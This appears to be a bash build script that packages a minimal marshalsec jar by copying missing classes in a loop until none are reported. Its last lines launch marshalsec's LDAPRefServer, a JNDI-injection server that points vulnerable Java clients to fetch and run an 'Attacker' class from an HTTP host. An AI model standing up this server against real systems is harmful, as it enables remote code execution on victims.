#!/bin/bash

mkdir -p com/unboundid/ldap/sdk/schema
mkdir -p com/unboundid/asn1
mkdir -p com/unboundid/ldap/protocol
mkdir -p com/unboundid/ldap/listener
mkdir -p com/unboundid/ldap/listener/interceptor
mkdir -p com/unboundid/ldap/sdk/controls
mkdir -p com/unboundid/util
cp ok/com/unboundid/ldap/sdk/schema/*ldif com/unboundid/ldap/sdk/schema/
cp ok/com/unboundid/asn1/*.class com/unboundid/asn1/
#cp ok/com/unboundid/ldap/protocol/BindRequestProtocolOp.class com/unboundid/ldap/protocol/
cp ok/com/unboundid/ldap/protocol/*.class com/unboundid/ldap/protocol/
cp ok/com/unboundid/ldap/listener/*.class com/unboundid/ldap/listener/
cp ok/com/unboundid/ldap/sdk/*.class com/unboundid/ldap/sdk/
cp ok/com/unboundid/ldap/listener/interceptor/*.class com/unboundid/ldap/listener/interceptor/
cp ok/com/unboundid/ldap/sdk/controls/*.class com/unboundid/ldap/sdk/controls/
cp ok/com/unboundid/util/*.class com/unboundid/util/

function cp_file() {
  base=$1
  if [ "${base}w" == "w" ]; then
    return
  fi
  cl="ok/"${base}.class
  dir=`dirname ${base}`
  mkdir -p "${dir}"
  #cp "${cl}" "${dir}/" 2>/dev/null
  cp ok/${base}*.class "${dir}/" 2>/dev/null
  #cp -r ok/${dir} ${dir}/..
}

while [ True ];
do
  java -cp . marshalsec.jndi.LDAPRefServer "http://localhost:12345/#Attacker" 1234 > /dev/null 2>/tmp/aaa
  suc=`cat /tmp/aaa | grep "Listening on 0.0.0.0:1234" | wc -l | awk '{print $1}'`
  if [ $suc -eq 1 ]; then
    cat /tmp/aaa
  fi
  base1=`cat /tmp/aaa | egrep 'java.lang.ClassNotFoundException' | awk '{print $4}' | sed s'#\.#/#g'`
  cp_file "${base1}"
  base2=`cat /tmp/aaa | egrep 'java.lang.ClassNotFoundException' | awk '{print $6}' | sed s'#\.#/#g'`
  cp_file "${base2}"
  base3=`cat /tmp/aaa | egrep 'java.lang.NoClassDefFoundError' | awk '{print $4}' | sed s'#\.#/#g'`
  cp_file "${base3}"
  base4=`cat /tmp/aaa | egrep 'java.lang.NoClassDefFoundError' | awk '{print $6}' | sed s'#\.#/#g'`
  cp_file "${base4}"
  if [ "${base1}w" == "w" -a "${base2}w" == "w" -a "${base3}w" == "w" -a "${base4}w" == "w" ]; then
    break
  fi
done 

rm -f marshalsec-0.0.3-SNAPSHOT.jar
jar cvf marshalsec-0.0.3-SNAPSHOT.jar com marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT.jar marshalsec.jndi.LDAPRefServer "http://localhost:12345/#Attacker" 1234
#java -cp . marshalsec.jndi.LDAPRefServer "http://localhost:12345/#Attacker" 1234
